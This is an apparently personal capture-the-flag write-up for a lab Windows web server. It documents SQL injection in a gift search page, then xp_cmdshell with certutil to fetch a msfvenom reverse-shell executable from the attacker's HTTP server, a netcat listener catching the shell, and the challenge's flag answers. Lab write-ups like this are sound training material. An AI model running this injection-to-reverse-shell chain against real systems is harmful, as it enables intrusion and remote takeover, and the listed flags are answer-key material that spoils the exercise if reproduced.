Whatweb Result: 
	[ http://10.10.86.217 [200 OK] Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[Microsoft-IIS/10.0], IP[10.10.86.217], JQuery, Microsoft-IIS[10.0], PHP[8.2.11], Script, Title[Worst Grumpy Company], X-Powered-By[PHP/8.2.11], X-UA-Compatible[IE=edge] ]

--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

[1] http://10.10.86.217/giftresults.php? is the search form -->> vulnerable after trying 'or 1=1'
	
[2] output Database query error: Array ( [0] => Array ( [0] => 42000 [SQLSTATE] => 42000 [1] => 105 [code] => 105 [2 => [Microsoft][ODBC Driver 17 for SQL Server][SQL Server]
	
[3] http://10.10.86.217/giftresults.php?age='OR 1=1 --senior&budget=30 // 

	lets try to inject an reverse shell 
		msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LocalIpAdress> LPORT=4444 -f exe -o reverse.exe 

		put revershell in ~ and python3 -m http.server 8000

		http://10.10.86.217/giftresults.php?age='; EXEC xp_cmdshell 'certutil -urlcache -f http://LocalIpAdress:8000/reverse.exe C:\Windows\Temp\reverse.exe'; --

		python3 -m http.server 8000   
		Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
		10.10.86.217 - - [17/Dec/2023 11:53:55] "GET /reverse.exe HTTP/1.1" 200 -

	setup netcat to selected port:  nc -lvnp 4444

	now execute the reverseshell 
	http://10.10.86.217/giftresults.php?age=%27;%20EXEC%20xp_cmdshell%20%27C:\Windows\Temp\reverse.exe%27;%20--


		└─$ nc -lvnp 4444
		listening on [any] 4444 ...
		connect to [10.8.224.251] from (UNKNOWN) [10.10.86.217] 49900
		Microsoft Windows [Version 10.0.17763.1821]
		(c) 2018 Microsoft Corporation. All rights reserved.
		C:\Windows\system32>    

[4]C:\Users\Administrator\Desktop>type Note.txt

[5]C:\Users\Administrator\Desktop>restore_website.bat // Go check restored webpage /index.php for flag


	answer[1] : giftresults.php
	answer[2] : ODBC Driver 17 for SQL Server
	answer[3] : THM{a4ffc901c27fb89efe3c31642ece4447}
	answer[4] : THM{b06674fedd8dfc28ca75176d3d51409e}
	answer[5] : THM{4cbc043631e322450bc55b42c}
